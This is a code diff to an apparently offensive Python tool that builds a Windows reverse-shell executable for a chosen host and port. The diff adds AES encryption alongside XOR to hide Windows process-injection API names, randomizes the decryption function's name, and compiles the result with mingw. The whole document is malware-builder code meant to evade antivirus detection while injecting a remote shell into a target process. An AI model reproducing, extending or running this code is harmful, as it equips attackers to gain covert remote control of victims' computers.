@@ -6,6 +6,8 @@ import random
 import os
 import hashlib
 import string
+from Crypto.Cipher import AES
+from os import urandom
 
 class Colors:
     HEADER = '\033[95m'
@@ -36,6 +38,9 @@ class PeekabooEncryptor():
     def dll_key(self):
         return self.XOR_DLL
 
+    def aes_key(self):
+        return self.random_bytes()
+
     def xor(self, data, key):
         key = str(key)
         l = len(key)
@@ -54,9 +59,38 @@ class PeekabooEncryptor():
         ciphertext = '{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };'
         return ciphertext, key
 
+    def pad(self, s):
+        return s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)
+
+    def convert(self, data):
+        output_str = ""
+        for i in range(len(data)):
+            current = data[i]
+            ordd = lambda x: x if isinstance(x, int) else ord(x)
+            output_str += hex(ordd(current))
+        return output_str.split("0x")
+
+    # AES encryption
+    # key is randomized (16 bytes random string),
+    # and the key is then transform into the SHA256 hash and
+    # then it is used as a key for encrypting plaintext
+    def aes_encrypt(self, plaintext, key):
+        k = hashlib.sha256(key).digest()
+        iv = 16 * '\x00'
+        plaintext = self.pad(plaintext)
+        cipher = AES.new(k, AES.MODE_CBC, iv.encode("UTF-8"))
+        ciphertext = cipher.encrypt(plaintext.encode("UTF-8"))
+        ciphertext, key = self.convert(ciphertext), self.convert(key)
+        ciphertext = '{' + (' 0x'.join(x + "," for x in ciphertext)).strip(",") + ' };'
+        key = '{' + (' 0x'.join(x + "," for x in key)).strip(",") + ' };'
+        return ciphertext, key
+
     def random(self):
         length = random.randint(16, 32)
         return ''.join(random.choice(string.ascii_letters) for i in range(length))
+
+    def random_bytes(self):
+        return urandom(16)
 
 def generate_payload(host, port):
     print (Colors.BLUE + "generate reverse shell payload..." + Colors.ENDC)
@@ -104,21 +138,23 @@ def run_peekaboo(host, port, proc_name, mode):
     f_xor = "XOR("
     f_inj = "Inject("
     f_ftt = "FindTarget"
+    f_aes = "AESDecrypt("
 
     k32_name = "kernel32"
 
     print (Colors.BLUE + "process name: " + proc_name + "..." + Colors.ENDC)
     print (Colors.BLUE + "encrypt..." + Colors.ENDC)
     f_xor, f_inj, f_ftt = encryptor.random(), encryptor.random(), encryptor.random()
+    f_aes = encryptor.random()
     ciphertext, p_key = encryptor.xor_encrypt(plaintext, encryptor.payload_key())
     ciphertext_vaex, vaex_key = encryptor.xor_encrypt(f_vaex, encryptor.func_key())
     ciphertext_wpm, wpm_key = encryptor.xor_encrypt(f_wpm, encryptor.func_key())
     ciphertext_cth, ct_key = encryptor.xor_encrypt(f_cth, encryptor.func_key())
     ciphertext_wfso, wfso_key = encryptor.xor_encrypt(f_wfso, encryptor.func_key())
-    ciphertext_clh, clh_key = encryptor.xor_encrypt(f_clh, encryptor.func_key())
+    ciphertext_clh, clh_key = encryptor.aes_encrypt(f_clh, encryptor.aes_key())
     ciphertext_p32f, p32f_key = encryptor.xor_encrypt(f_p32f, encryptor.func_key())
     ciphertext_p32n, p32n_key = encryptor.xor_encrypt(f_p32n, encryptor.func_key())
-    ciphertext_op, op_key = encryptor.xor_encrypt(f_op, encryptor.func_key())
+    ciphertext_op, op_key = encryptor.aes_encrypt(f_op, encryptor.aes_key())
     ciphertext_ct32s, ct32s_key = encryptor.xor_encrypt(f_ct32s, encryptor.func_key())
     ciphertext_proc, proc_key = encryptor.xor_encrypt(proc_name, encryptor.proc_key())
     ciphertext_k32, k32_key = encryptor.xor_encrypt(k32_name, encryptor.dll_key())
@@ -145,13 +181,14 @@ def run_peekaboo(host, port, proc_name, mode):
     data = data.replace('char s_wpm_key[] = "";', 'char s_wpm_key[] = "' + wpm_key + '";')
     data = data.replace('char s_cth_key[] = "";', 'char s_cth_key[] = "' + ct_key + '";')
     data = data.replace('char s_wfso_key[] = "";', 'char s_wfso_key[] = "' + wfso_key + '";')
-    data = data.replace('char s_clh_key[] = "";', 'char s_clh_key[] = "' + clh_key + '";')
+    data = data.replace('char s_clh_key[] = "";', 'char s_clh_key[] = ' + clh_key)
     data = data.replace('char s_p32f_key[] = "";', 'char s_p32f_key[] = "' + p32f_key + '";')
     data = data.replace('char s_p32n_key[] = "";', 'char s_p32n_key[] = "' + p32n_key + '";')
-    data = data.replace('char s_op_key[] = "";', 'char s_op_key[] = "' + op_key + '";')
+    data = data.replace('char s_op_key[] = "";', 'char s_op_key[] = ' + op_key)
     data = data.replace('char s_ct32s_key[] = "";', 'char s_ct32s_key[] = "' + ct32s_key + '";')
     data = data.replace('char k32_key[] = "";', 'char k32_key[] = "' + k32_key + '";')
     data = data.replace('XOR(', f_xor + "(")
+    data = data.replace('AESDecrypt(', f_aes + "(")
     data = data.replace("Inject(", f_inj + "(")
     data = data.replace("FindTarget(", f_ftt + "(")
 
@@ -168,7 +205,7 @@ def run_peekaboo(host, port, proc_name, mode):
     try:
         cmd = "x86_64-w64-mingw32-gcc -O2 peekaboo-enc.cpp -o peekaboo.exe -m" + mode + " -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive >/dev/null 2>&1"
         os.system(cmd)
-        os.remove("peekaboo-enc.cpp")
+        # os.remove("peekaboo-enc.cpp")
     except:
         print (Colors.RED + "error compiling template :(" + Colors.ENDC)
         sys.exit()
